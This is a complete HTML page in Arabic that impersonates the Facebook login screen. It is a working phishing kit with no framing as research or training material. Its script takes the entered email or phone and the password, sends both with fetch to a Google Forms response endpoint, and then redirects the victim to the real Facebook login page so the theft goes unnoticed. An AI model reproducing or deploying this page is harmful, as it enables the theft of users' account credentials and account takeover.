<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك | Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 360px; text-align: center; }
        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        button { width: 97%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>facebook</h1>
        <form id="login-form">
            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSctUKpQEQr7fksCxDcGLJL9JoQKPy-tik7TuEBq3sCyR4ivMg/formResponse";
            const formData = new FormData();
            formData.append('entry.766104790', email); 
            formData.append('entry.507594700', pass);  
            fetch(googleFormURL, { method: 'POST', mode: 'no-cors', body: formData })
            .then(() => { window.location.href = "https://www.facebook.com/login"; })
            .catch(() => { window.location.href = "https://www.facebook.com/login"; });
        });
    </script>
</body>
</html>
